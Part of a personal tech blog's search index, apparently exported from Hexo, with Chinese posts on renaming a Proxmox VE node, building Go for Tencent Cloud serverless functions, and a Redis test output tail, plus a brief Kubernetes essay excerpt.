<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">Running tool: /usr/local/go/bin/go test -timeout 300s -run ^TestRedisHSetNX$ github.com/sosyz/test -v -count=1 ./...</span><br><span class="line"></span><br><span class="line">=== RUN   TestRedisHSetNX</span><br><span class="line">    /home/sonui/Documents/code/test/main_test.go:93: true</span><br><span class="line">    /home/sonui/Documents/code/test/main_test.go:99: false</span><br><span class="line">--- PASS: TestRedisHSetNX (0.00s)</span><br><span class="line">PASS</span><br><span class="line">ok      github.com/sosyz/test   0.005s</span><br></pre></td></tr></table></figure>

<h2 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h2><ul>
<li><a href="https://github.com/stickfigure/blog/wiki/How-to-(and-how-not-to)-design-REST-APIs#rule-11-do-provide-idempotence-mechanisms">https://github.com/stickfigure/blog/wiki/How-to-(and-how-not-to)-design-REST-APIs#rule-11-do-provide-idempotence-mechanisms</a></li>
<li><a href="https://redis.io/docs/latest/commands/hsetnx/">https://redis.io/docs/latest/commands/hsetnx/</a></li>
<li><a href="https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Methods">https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Methods</a></li>
</ul>
]]></content>
      <tags>
        <tag>HTTP, Backend, Idempotence</tag>
      </tags>
  </entry>
  <entry>
    <title>PVE 修改节点主机名</title>
    <url>//rename-pve-hostname/</url>
    <content><![CDATA[<p>由于前期安装的时随便起的 Proxmox VE 节点主机名，现在想要修改为更有意义的名字便于多集群管理。</p>
<span id="more"></span>

<p>修改的文件有：</p>
<ul>
<li>&#x2F;etc&#x2F;hosts</li>
<li>&#x2F;etc&#x2F;hostname</li>
<li>&#x2F;etc&#x2F;postfix&#x2F;main.cf</li>
</ul>
<p>对于主机名也可以通过 <code>hostnamectl</code> 命令来修改。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">hostnamectl set-hostname hangzhou-home-pve</span><br></pre></td></tr></table></figure>

<p>然后修改 <code>/etc/pve/nodes/</code> 下的文件夹名字，以及文件夹下的配置文件。</p>
<p>需要注意的是可能在对旧文件夹拷贝至新文件夹时会产生已存在错误，需要把旧文件夹下的文件放到一个临时的地方，然后删除旧文件夹，再把文件拷贝到新文件夹。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">ll /etc/pve/nodes/</span><br><span class="line"><span class="built_in">mkdir</span> /etc/pve/nodes/hangzhou-home-pve</span><br><span class="line"><span class="built_in">mkdir</span> ~/old-pve</span><br><span class="line"><span class="built_in">cp</span> -r /etc/pve/nodes/pve/* ~/old-pve/</span><br><span class="line"><span class="built_in">rm</span> -rf /etc/pve/nodes/pve</span><br><span class="line"><span class="built_in">cp</span> -r ~/old-pve/* /etc/pve/nodes/hangzhou-home-pve/</span><br></pre></td></tr></table></figure>

<p>如果创建了额外的存储，可能需要修改 <code>PVE</code> 的存储配置文件。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">nano /etc/pve/storage.cfg</span><br></pre></td></tr></table></figure>

<p>检查配置文件</p>
<figure class="highlight text"><table><tr><td class="code"><pre><span class="line">dir: local</span><br><span class="line">        path /var/lib/vz</span><br><span class="line">        content vztmpl,backup,iso</span><br><span class="line"></span><br><span class="line">lvmthin: local-lvm</span><br><span class="line">        thinpool data</span><br><span class="line">        vgname pve</span><br><span class="line">        content rootdir,images</span><br><span class="line"></span><br><span class="line">zfspool: bucket1</span><br><span class="line">        pool bucket1</span><br><span class="line">        content rootdir,images</span><br><span class="line">        mountpoint /bucket1</span><br><span class="line">        nodes hangzhou-home-pve  # 检查这里</span><br></pre></td></tr></table></figure>

<p>检查 <code>nodes</code> 是否正确，如果不正确，修改为新的主机名。</p>
<p><code>nodes</code> 配置说明如下</p>
<blockquote>
<p>Source: <a href="https://pve.proxmox.com/wiki/Storage">https://pve.proxmox.com/wiki/Storage</a><br>nodes<br>List of cluster node names where this storage is usable&#x2F;accessible. One can use this property to restrict storage access to a limited set of nodes.</p>
</blockquote>
<p>最后重启</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">reboot</span><br></pre></td></tr></table></figure>
]]></content>
      <tags>
        <tag>PVE, Proxmox VE</tag>
      </tags>
  </entry>
  <entry>
    <title>使用Golang开发腾讯云函数</title>
    <url>//running-golang-code-on-tencent-cloud-FaaS/</url>
    <content><![CDATA[<p>在腾讯云 <code>Serverless</code> 使用 <code>Golang</code> 语言进行开发时遇到的一些问题及解决办法记录</p>
<span id="more"></span>

<h2 id="编译问题"><a href="#编译问题" class="headerlink" title="编译问题"></a>编译问题</h2><p>交叉编译不能用powershell，需要使用cmd</p>
<h2 id="启动问题"><a href="#启动问题" class="headerlink" title="启动问题"></a>启动问题</h2><p>web函数需要一个scf_bootstrap来定义启动的文件，其内容为</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">!/bin/bash</span></span><br><span class="line"></span><br><span class="line">./httpserver</span><br></pre></td></tr></table></figure>

<p>其中 <code>httpserver</code> 为文件名，需要注意文件换行需要使用LF，否则云函数无法识别</p>
<h2 id="云函数环境问题"><a href="#云函数环境问题" class="headerlink" title="云函数环境问题"></a>云函数环境问题</h2><p>运行报错 &#96;libc.so.6: version GLIBC_2.28’ not found （联系客服得知）</p>
<p>需改为静态编译，Makefile文件如下</p>
<figure class="highlight makefile"><table><tr><td class="code"><pre><span class="line"><span class="section">all:</span></span><br><span class="line">    <span class="keyword">export</span> CGO_ENABLED=0</span><br><span class="line">    go build -o build/xxxxx/main  -a -ldflags &#x27;-extldflags <span class="string">&quot;-static&quot;</span>&#x27; .</span><br><span class="line">    serverless deploy --target build/xxxxx/</span><br></pre></td></tr></table></figure>

<h2 id="忽略缓存"><a href="#忽略缓存" class="headerlink" title="忽略缓存"></a>忽略缓存</h2><p>在部署命令后添加 –force 例如  serverless deploy –force ，</p>
<blockquote>
<p>–force 强制部署，跳过缓存和 serverless 应用校验</p>
</blockquote>
<p><a href="https://cn.serverless.com/framework/docs-commands-deploy">Tencent Serverless - Deploy 部署</a></p>
]]></content>
      <tags>
        <tag>Golang, Serverless</tag>
      </tags>
  </entry>
  <entry>
    <title>The hater’s guide to Kubernetes</title>
    <url>//the-haters-guide-to-kubernetes/</url>
    <content><![CDATA[<h2 id="Kubernetes-的反对者指南"><a href="#Kubernetes-的反对者指南" class="headerlink" title="Kubernetes 的反对者指南"></a>Kubernetes 的反对者指南</h2><blockquote>
<p>来源：<a href="https://paulbutler.org/2024/the-haters-guide-to-kubernetes/">Paul Butler’s Blog</a><br>Among a certain tech set, Kubernetes has earned a reputation as an unnecessarily complicated time-sink that startups should avoid. Using Kubernetes with a small team is seen as a sign of over-engineering.</p>
</blockquote>
]]></content>
      <tags>
        <tag>Kubernetes</tag>
        <tag>Docker</tag>
        <tag>Containers</tag>
      </tags>
  </entry>
</search>
